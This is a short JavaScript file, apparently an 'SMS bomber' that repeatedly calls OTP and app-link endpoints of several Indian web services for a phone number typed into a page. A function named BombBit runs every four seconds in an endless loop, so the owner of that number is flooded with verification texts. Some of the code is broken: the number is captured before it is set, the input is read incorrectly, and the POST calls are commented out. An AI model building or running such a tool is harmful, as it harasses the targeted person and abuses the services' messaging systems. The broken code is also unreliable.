let phone ;

const API_LIST =[
    {
        url:"https://login.housing.com/api/v2/send-otp",
        method:"post",
        request: {
            "phone": phone
        }
    },
    {
        url:"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile="+phone,
        method:"get"
    },
    {
        url:"https://api.nnnow.com/d/api/appDownloadLink",
        method:"post",
        request: {
            "mobileNumber": phone
        }
    },
    {
        url:"https://unacademy.com/api/v1/user/get_app_link/",
        method:"post",
        request: {
            "phone": phone
        }
    },
    {
        url:"https://www.treebo.com/api/v2/auth/login/otp/",
        method:"post",
        request: {
            "phone_number": phone
        }
    },
    {
        url:"https://pharmeasy.in/api/auth/requestOTP",
        method:"post",
        request: {
            "contactNumber": phone
        }
    },
]

const callPostAPI = (val) =>{
 

fetch(val.url, {
  method: 'POST', // or 'PUT'
  headers: {
    "Content-Type": "application/json",
    'Access-Control-Allow-Origin': '*',
  },
  body: JSON.stringify(val.request),
})
.then(response => response.json())
.then(data => {
  console.log('Success:', data);
})
.catch((error) => {
  console.error('POST API Error:', error);
});

}
const callGetAPI = (val) =>{

    fetch(val.url)
    .then(response => response.json())
    .then(data => console.log(data))
    .catch((error) => {
        console.error('GET API Error:', error);
      });
}



const BombBit = () =>{
    API_LIST.map((val,ind)=>{

        if(val.method.toLowerCase() == "post"){
          //  callPostAPI(val);
            return;
        }
        callGetAPI(val);
    
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function CallApiLoop() {
    phone = document.getElementById('phone').val;

   if(phone.length === 10){
    while(true){
         BombBit();
        await sleep(4000);
    }
}
else{
    alert("Invalid Phone number!");
}
          
}
















